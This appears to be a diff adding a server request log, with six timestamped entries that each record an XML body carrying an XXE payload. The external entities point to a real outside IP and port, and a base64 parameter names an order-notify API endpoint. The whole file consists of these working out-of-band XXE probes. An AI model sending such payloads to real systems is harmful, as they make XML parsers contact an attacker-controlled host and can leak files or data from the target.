@@ -1,0 +1,39 @@
+03:11:24|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019110803_328?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:11:24|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019110803_328?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:24:23|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019110803_328?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:24:24|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019110803_328?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:34:51|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019110803_328?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:34:51|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019110803_328?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
